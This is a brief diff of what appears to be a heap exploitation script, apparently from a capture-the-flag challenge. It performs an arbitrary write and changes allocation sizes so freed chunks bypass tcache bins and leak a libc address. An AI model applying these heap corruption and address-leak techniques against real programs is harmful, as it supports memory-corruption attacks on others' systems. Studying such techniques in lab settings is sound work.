@@ -78,9 +78,9 @@ print('Arbitrary (min_heap): %#x' % arbitrary)
 
 write(arbitrary, 8, p64(0x7fffffffffffffff))
 
-# Leak Libc - easy just allocate something that DO NOT go into a tcache bin
-a = malloc(0x570)
-b = malloc(0x570)
+# Leak Libc - easy just allocate something that DO NOT go into a tcache bin (max size 0x408 or 1032)
+a = malloc(0x409)
+b = malloc(0x409)
 
 free(a)
 leak_libc = show(a, 1)
